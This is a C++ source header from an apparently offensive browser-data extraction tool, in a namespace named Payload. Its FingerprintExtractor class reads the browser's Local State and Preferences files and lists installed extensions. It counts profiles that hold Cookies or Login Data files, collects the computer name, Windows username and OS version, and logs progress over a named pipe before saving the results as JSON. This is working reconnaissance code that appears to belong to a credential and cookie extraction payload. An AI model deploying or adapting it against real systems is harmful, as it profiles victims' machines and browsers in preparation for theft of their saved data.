// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#pragma once

#include "../core/common.hpp"
#include "pipe_client.hpp"
#include "browser_config.hpp"
#include <fstream>
#include <sstream>
#include <chrono>
#include <vector>
#include <iomanip>

namespace Payload {

    class FingerprintExtractor {
    public:
        FingerprintExtractor(PipeClient& pipe, const BrowserConfig& browser, 
                             const std::filesystem::path& outputBase)
            : m_pipe(pipe), m_browser(browser), m_outputBase(outputBase) {}

        void Extract() {
            m_pipe.LogDebug("Extracting comprehensive fingerprint...");
            
            std::ostringstream json;
            json << "{\n";
            
            // Basic browser info
            json << "  \"browser\": \"" << m_browser.name << "\",\n";
            
            // Get executable path and version
            char exePath[MAX_PATH] = {0};
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            json << "  \"executable_path\": \"" << EscapeJson(exePath) << "\",\n";
            
            ExtractVersion(json, exePath);
            
            json << "  \"user_data_path\": \"" << EscapeJson(m_browser.userDataPath.string()) << "\",\n";
            
            // Local State analysis
            ExtractLocalState(json);
            
            // Preferences analysis
            ExtractPreferences(json);
            
            // Extensions
            ExtractExtensions(json);
            
            // Profile count
            ExtractProfileCount(json);
            
            // System info
            ExtractSystemInfo(json);
            
            // Timestamps
            ExtractTimestamps(json);
            
            // Remove trailing comma and close
            json << "  \"extraction_complete\": true\n";
            json << "}";
            
            // Write to file
            auto outFile = m_outputBase / m_browser.name / "fingerprint.json";
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            if (out) {
                out << json.str();
                m_pipe.LogDebug("Fingerprint saved to " + outFile.filename().string());
            }
        }

    private:
        void ExtractVersion(std::ostringstream& json, const char* exePath) {
            DWORD handle = 0;
            DWORD versionSize = GetFileVersionInfoSizeA(exePath, &handle);
            if (versionSize > 0) {
                std::vector<BYTE> versionData(versionSize);
                if (GetFileVersionInfoA(exePath, 0, versionSize, versionData.data())) {
                    VS_FIXEDFILEINFO* fileInfo = nullptr;
                    UINT len = 0;
                    if (VerQueryValueA(versionData.data(), "\\", (LPVOID*)&fileInfo, &len) && len > 0) {
                        json << "  \"browser_version\": \""
                             << HIWORD(fileInfo->dwFileVersionMS) << "."
                             << LOWORD(fileInfo->dwFileVersionMS) << "."
                             << HIWORD(fileInfo->dwFileVersionLS) << "."
                             << LOWORD(fileInfo->dwFileVersionLS) << "\",\n";
                    }
                }
            }
        }

        void ExtractLocalState(std::ostringstream& json) {
            auto localStatePath = m_browser.userDataPath / "Local State";
            if (!std::filesystem::exists(localStatePath)) return;

            std::ifstream f(localStatePath);
            if (!f) return;

            std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            
            // Sync/account status
            json << "  \"sync_enabled\": " << (ContainsKey(content, "account_info") ? "true" : "false") << ",\n";
            
            // Enterprise management
            json << "  \"enterprise_managed\": " << (ContainsKey(content, "enterprise") ? "true" : "false") << ",\n";
            
            // Update channel detection
            std::string channel = "stable";
            if (ContainsKey(content, "\"canary\"")) channel = "canary";
            else if (ContainsKey(content, "\"dev\"")) channel = "dev";
            else if (ContainsKey(content, "\"beta\"")) channel = "beta";
            json << "  \"update_channel\": \"" << channel << "\",\n";
            
            // Default search engine
            size_t searchPos = content.find("default_search_provider_data");
            if (searchPos != std::string::npos) {
                std::string searchEngine = "unknown";
                std::string searchSection = content.substr(searchPos, std::min<size_t>(2000, content.size() - searchPos));
                if (searchSection.find("google") != std::string::npos) searchEngine = "Google";
                else if (searchSection.find("bing") != std::string::npos) searchEngine = "Bing";
                else if (searchSection.find("duckduckgo") != std::string::npos) searchEngine = "DuckDuckGo";
                else if (searchSection.find("yahoo") != std::string::npos) searchEngine = "Yahoo";
                else if (searchSection.find("ecosia") != std::string::npos) searchEngine = "Ecosia";
                json << "  \"default_search_engine\": \"" << searchEngine << "\",\n";
            }
            
            // Hardware acceleration
            json << "  \"hardware_acceleration\": " << (ContainsKey(content, "hardware_acceleration_mode_enabled") ? "true" : "false") << ",\n";
            
            // Browser metrics consent
            json << "  \"metrics_enabled\": " << (ContainsKey(content, "\"enabled\":true", "metrics") ? "true" : "false") << ",\n";
        }

        void ExtractPreferences(std::ostringstream& json) {
            auto prefsPath = m_browser.userDataPath / "Default" / "Preferences";
            if (!std::filesystem::exists(prefsPath)) return;

            std::ifstream f(prefsPath);
            if (!f) return;

            std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            
            // Security features
            json << "  \"autofill_enabled\": " << (ContainsKey(content, "autofill") ? "true" : "false") << ",\n";
            json << "  \"password_manager_enabled\": " << (ContainsKey(content, "credentials_enable_service") ? "true" : "false") << ",\n";
            json << "  \"safe_browsing_enabled\": " << (ContainsKey(content, "safebrowsing") ? "true" : "false") << ",\n";
            
            // Additional security settings
            json << "  \"do_not_track\": " << (ContainsKey(content, "enable_do_not_track") ? "true" : "false") << ",\n";
            json << "  \"third_party_cookies_blocked\": " << (ContainsKey(content, "block_third_party_cookies") ? "true" : "false") << ",\n";
            
            // Privacy settings
            json << "  \"translate_enabled\": " << (ContainsKey(content, "translate") && !ContainsKey(content, "\"translate\":{\"enabled\":false}") ? "true" : "false") << ",\n";
        }

        void ExtractExtensions(std::ostringstream& json) {
            auto extensionsPath = m_browser.userDataPath / "Default" / "Extensions";
            if (!std::filesystem::exists(extensionsPath)) {
                json << "  \"installed_extensions_count\": 0,\n";
                return;
            }

            std::vector<std::string> extensionIds;
            try {
                for (const auto& entry : std::filesystem::directory_iterator(extensionsPath)) {
                    if (entry.is_directory()) {
                        extensionIds.push_back(entry.path().filename().string());
                    }
                }
            } catch (...) {}

            json << "  \"installed_extensions_count\": " << extensionIds.size() << ",\n";
            
            if (!extensionIds.empty()) {
                json << "  \"extension_ids\": [";
                for (size_t i = 0; i < extensionIds.size(); ++i) {
                    json << "\"" << extensionIds[i] << "\"";
                    if (i < extensionIds.size() - 1) json << ", ";
                }
                json << "],\n";
            }
        }

        void ExtractProfileCount(std::ostringstream& json) {
            int profileCount = 0;
            try {
                for (const auto& entry : std::filesystem::directory_iterator(m_browser.userDataPath)) {
                    if (entry.is_directory()) {
                        auto cookiePath = entry.path() / "Network" / "Cookies";
                        auto loginPath = entry.path() / "Login Data";
                        if (std::filesystem::exists(cookiePath) || std::filesystem::exists(loginPath)) {
                            profileCount++;
                        }
                    }
                }
            } catch (...) {}
            json << "  \"profile_count\": " << profileCount << ",\n";
        }

        void ExtractSystemInfo(std::ostringstream& json) {
            // Computer name
            char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
            DWORD size = sizeof(computerName);
            if (GetComputerNameA(computerName, &size)) {
                json << "  \"computer_name\": \"" << EscapeJson(computerName) << "\",\n";
            }

            // Windows username
            char userName[256] = {0};
            DWORD userSize = sizeof(userName);
            if (GetUserNameA(userName, &userSize)) {
                json << "  \"windows_user\": \"" << EscapeJson(userName) << "\",\n";
            }

            // OS Version info
            OSVERSIONINFOEXW osInfo = {0};
            osInfo.dwOSVersionInfoSize = sizeof(osInfo);
            
            // Try RtlGetVersion (more reliable than GetVersionEx)
            using RtlGetVersionPtr = NTSTATUS(WINAPI*)(PRTL_OSVERSIONINFOW);
            if (auto ntdll = GetModuleHandleW(L"ntdll.dll")) {
                if (auto pRtlGetVersion = reinterpret_cast<RtlGetVersionPtr>(GetProcAddress(ntdll, "RtlGetVersion"))) {
                    if (pRtlGetVersion(reinterpret_cast<PRTL_OSVERSIONINFOW>(&osInfo)) == 0) {
                        json << "  \"os_version\": \"" << osInfo.dwMajorVersion << "." 
                             << osInfo.dwMinorVersion << "." << osInfo.dwBuildNumber << "\",\n";
                    }
                }
            }

            // Architecture
            SYSTEM_INFO sysInfo;
            GetNativeSystemInfo(&sysInfo);
            const char* arch = "unknown";
            switch (sysInfo.wProcessorArchitecture) {
                case PROCESSOR_ARCHITECTURE_AMD64: arch = "x64"; break;
                case PROCESSOR_ARCHITECTURE_ARM64: arch = "ARM64"; break;
                case PROCESSOR_ARCHITECTURE_INTEL: arch = "x86"; break;
            }
            json << "  \"architecture\": \"" << arch << "\",\n";
        }

        void ExtractTimestamps(std::ostringstream& json) {
            // Local State last modified
            auto localStatePath = m_browser.userDataPath / "Local State";
            if (std::filesystem::exists(localStatePath)) {
                try {
                    auto ftime = std::filesystem::last_write_time(localStatePath);
                    auto sctp = std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                        ftime - std::filesystem::file_time_type::clock::now() + std::chrono::system_clock::now());
                    auto time = std::chrono::system_clock::to_time_t(sctp);
                    json << "  \"last_config_update\": " << time << ",\n";
                } catch (...) {}
            }

            // Current extraction time
            auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
            json << "  \"extraction_timestamp\": " << now << ",\n";
        }

        bool ContainsKey(const std::string& content, const std::string& key, const std::string& context = "") {
            if (context.empty()) {
                return content.find(key) != std::string::npos;
            }
            size_t contextPos = content.find(context);
            if (contextPos == std::string::npos) return false;
            size_t keyPos = content.find(key, contextPos);
            return keyPos != std::string::npos && keyPos < contextPos + 500;
        }

        std::string EscapeJson(const std::string& s) {
            std::ostringstream o;
            for (char c : s) {
                switch (c) {
                    case '"':  o << "\\\""; break;
                    case '\\': o << "\\\\"; break;
                    case '\b': o << "\\b"; break;
                    case '\f': o << "\\f"; break;
                    case '\n': o << "\\n"; break;
                    case '\r': o << "\\r"; break;
                    case '\t': o << "\\t"; break;
                    default:
                        if (static_cast<unsigned char>(c) < 0x20) {
                            o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << static_cast<int>(c);
                        } else {
                            o << c;
                        }
                }
            }
            return o.str();
        }

        PipeClient& m_pipe;
        const BrowserConfig& m_browser;
        std::filesystem::path m_outputBase;
    };

}
